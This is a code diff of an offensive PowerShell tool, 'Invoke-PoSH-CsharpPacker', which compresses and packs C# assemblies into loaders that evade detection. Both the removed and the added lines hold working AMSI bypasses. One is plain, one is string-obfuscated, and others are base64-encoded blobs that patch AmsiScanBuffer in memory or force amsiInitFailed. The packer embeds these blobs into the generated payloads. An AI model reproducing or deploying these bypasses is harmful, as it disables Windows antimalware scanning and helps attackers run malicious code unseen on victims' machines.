@@ -20,7 +20,7 @@ Write-Output "
   / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _ 
  | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
   \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|  
-                      |_|                               v2.1
+                      |_|                               v2.0
 
 Usage: 
 > Import-Module ./Invoke-PoSH-CsharpPacker.ps1
@@ -36,7 +36,7 @@ Features:
 "
 
 # ''A'''M''S''I''-''B''Y''P''A''S''S''
-ForEach($boat in $superaudit) {if ($boat.Name -like "*iutils") {$cap = $boat}};$data = $cap.GetFields('NonPublic,Static');ForEach($europe in $data) {if ($europe.Name -like "*itFailed") {$fire = $europe}};$fire.SetValue($null,$true)
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);
 
 function Invoke-PoSH-CsharpPacker {
 	
@@ -91,8 +91,8 @@ function Invoke-PoSH-CsharpPacker {
         $compressiontype = $compressiontypes | Get-Random
 
         Write-Output "[*] File compression (GZip/Deflate)"
-	$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
-	Del "C:\Windows\Temp\templatefile.ps1"
+				$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
+				Del "C:\Windows\Temp\templatefile.ps1"
         [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
@@ -150,9 +150,9 @@ function Invoke-PoSH-CsharpPacker {
         }
 		
         Write-Output "[*] Adding 'A'M'S'I' bypass"
-        $code_fixed_order4 += '${9} = "IyBTdXBlcg0KZnVuY3Rpb24gU3VwZXIgew0KICAgIFBhcmFtICgNCiAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1R5cGVbXV0NCiAgICAgJGZ1bmMsIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0gW1R5cGVdICRkZWxUeXBlID0gW1ZvaWRdDQogICAgKQ0KICAgICR0eXBlID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uDQogICAgRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksDQpbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pLg0KICAgIERlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS4NCiAgICBEZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywNCiAgICBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkNCiAgJHR5cGUuDQogICAgRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywNCltTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJGZ1bmMpLg0KICAgICBTZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCiAgJHR5cGUuDQogICAgRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkZGVsVHlwZSwNCiRmdW5jKS4gU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSw"' + "`r`n"
+        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order4 -join ''
-        $code_fixed_order5 += '${10} = "gTWFuYWdlZCcpDQogICAgcmV0dXJuICR0eXBlLkNyZWF0ZVR5cGUoKQ0KfQ0KIyBHZW5pYWwNCiRiYz0ibXNpUyINCiRkZT0idWZmIg0KZnVuY3Rpb24gR2VuaWFsIHsNCiAgICBQYXJhbSAoJG1vZHVsZU5hbWUsICRmdW5jdGlvbk5hbWUpDQogICAgJGFzc2VtID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8DQogICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS4NCiAgICAgRXF1YWxzKCdTeXN0ZW0uZGxsJykNCiAgICAgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQ0KICAgICR0bXA9QCgpDQogICAgJGFzc2VtLkdldE1ldGhvZHMoKSB8IEZvckVhY2gtT2JqZWN0IHtJZigkXy5OYW1lIC1saWtlICJHZSpQKm9jKmRkcmVzcyIpIHskdG1wKz0kX319DQogICAgcmV0dXJuICR0bXBbMF0uSW52b2tlKCRudWxsLCBAKCgkYXNzZW0uR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLA0KQCgkbW9kdWxlTmFtZSkpLCAkZnVuY3Rpb25OYW1lKSkNCn0NCiRhYj0iQSINCiRjZD0iY2FuQiINCiRlZj0iZXIiDQpbSW50UHRyXSRmdW5jQWRkciA9IEdlbmlhbCBhbXNpLmRsbCAoJGFiKyRiYyskY2QrJGRlKyRlZikNCiRvbGRQcm90ZWN0aW9uQnVmZmVyID0gMA0KJHZwPVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChHZW5pYWwga2VybmVsMzIuZGxsIFZpcnR1YWxQcm90ZWN0KSwgKFN1cGVyIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKSkpDQokdnAuSW52b2tlKCRmdW5jQWRkciwgMywgMHg0MCwgW3JlZl0kb2xkUHJvdGVjdGlvbkJ1ZmZlcikNCiRidWYgPSBbQnl0ZVtdXSAoMHhiOCwweDM0LDB4MTIsMHgwNywweDgwLDB4NjYsMHhiOCwweDMyLDB4MDAsMHhiMCwweDU3LDB4YzMpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRidWYsIDAsICRmdW5jQWRkciwgMTIp"' + "`r`n"
+        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order5 -join ''
         $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order6 -join ''
